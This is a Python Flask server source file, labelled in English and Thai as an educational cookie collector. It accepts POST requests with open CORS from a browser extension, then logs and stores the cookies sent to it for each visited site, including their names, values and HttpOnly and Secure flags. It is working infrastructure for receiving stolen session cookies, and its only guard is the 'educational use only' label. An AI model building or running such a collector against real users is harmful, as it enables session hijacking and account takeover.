"""
Educational Cookie Collector Server
⚠️ ใช้เพื่อการศึกษาเท่านั้น
"""
from flask import Flask, request, jsonify
from datetime import datetime
import json
import os

app = Flask(__name__)
CAPTURE_FILE = "captured.jsonl"


def _cors(response):
    response.headers["Access-Control-Allow-Origin"] = "*"
    response.headers["Access-Control-Allow-Methods"] = "POST, OPTIONS"
    response.headers["Access-Control-Allow-Headers"] = "Content-Type"
    return response


@app.route("/collect", methods=["POST", "OPTIONS"])
def collect():
    if request.method == "OPTIONS":
        return _cors(jsonify({"status": "ok"}))

    data = request.get_json(silent=True)
    if not data:
        return _cors(jsonify({"error": "no json"})), 400

    print("\n" + "=" * 70)
    print(f"[{datetime.now().isoformat()}] รับข้อมูลจาก extension")
    print(f"Source URL : {data.get('source_url')}")
    print(f"Hostname   : {data.get('hostname')}")
    print(f"Count      : {data.get('count')} cookies")

    for c in data.get("cookies", []):
        flags = []
        if c.get("httpOnly"): flags.append("HttpOnly")
        if c.get("secure"):   flags.append("Secure")
        if c.get("partitionKey"): flags.append("Partitioned")
        flag_str = f" [{','.join(flags)}]" if flags else ""
        print(f"  {c['domain']}{c['path']} | {c['name']} = {c['value'][:60]}{flag_str}")

    print("=" * 70)

    with open(CAPTURE_FILE, "a", encoding="utf-8") as f:
        f.write(json.dumps(data, ensure_ascii=False) + "\n")

    return _cors(jsonify({"status": "ok", "received": len(data.get("cookies", []))}))


if __name__ == "__main__":
    print("🔒 Educational Cookie Collector — ใช้เพื่อการศึกษาเท่านั้น")
    print("Listening on http://localhost:8000")
    app.run(host="127.0.0.1", port=8000, debug=True)